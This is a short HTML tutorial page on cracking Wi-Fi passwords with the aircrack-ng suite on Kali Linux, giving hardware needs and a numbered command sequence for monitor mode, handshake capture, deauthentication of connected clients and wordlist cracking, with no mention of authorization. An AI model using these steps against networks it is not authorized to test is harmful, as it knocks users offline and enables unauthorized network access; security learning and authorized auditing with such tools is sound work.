<h3>WiFi Hacking - Aircrack-ng</h3>

<p>Aircrack-ng is a powerful suite used to audit wireless networks. It captures WPA/WPA2 handshakes via packet sniffing (using tools like airodump-ng), then uses dictionary or brute-force attacks to crack the password. The process typically involves putting the Wi-Fi card into monitor mode, capturing the handshake during a client connection, and using aircrack-ng to attempt key recovery.</p>

OS = Kali Linux Live Everything > You may download it from https://kali.org<br>
Tools - aircrack-ng<br>
<br>
Hardwares - Atheros 9721 or ALFA Model AWUS036NH<br>
OR You may boot Kali Linux Live Everything by making a bootable USB using "RUFUS" and use your own laptop's network adapter <b>(Important! It should support "Monitor Mode" otherwise it will not work)<b><br>
<br>
Tool	Purpose	Example Command<br>
<br>
airmon-ng<br>
[Enable monitor mode] >>> sudo airmon-ng start wlan0<br>
<br>
airodump-ng<br>
[Capture network traffic] >>> sudo airodump-ng -c 6 wlan0mon<br>
<br>
aireplay-ng<br>
[Inject/deauth packets] >>> sudo aireplay-ng -0 1 ...<br>
<br>
aircrack-ng<br>
[Crack WPA/WEP keys] >>> sudo aircrack-ng -w wordlist.lst ...<br>
<br>
<br>
Kali Linux Commands:<br>
<br>
1. ifconfig to check network interfaces<br>
2. iwconfig to check wireless interfaces<br>
 By default the wireless interface is in MANAGED MODE. <br>
3. airmon-ng stop wlan0 (STOP - if the interface is wlan0)<br>
4. airmon-ng start wlan0 (START - It will be gone into monitoring mode)<br>
5. airodump-ng wlan0 or wlan0mon<br>
6. airodump-ng --bssid <b>BSSID</b> --channel <b>CHANNEL</b> -w <b>ESSID</b> wlan0 (or if its wlan0mon)<br>
7. Open another terminal or terminal tab and then enter the following command<br>
8. aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon<br>
   Or wait for someone to join the network. <br>
9. aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture-01.cap<br>
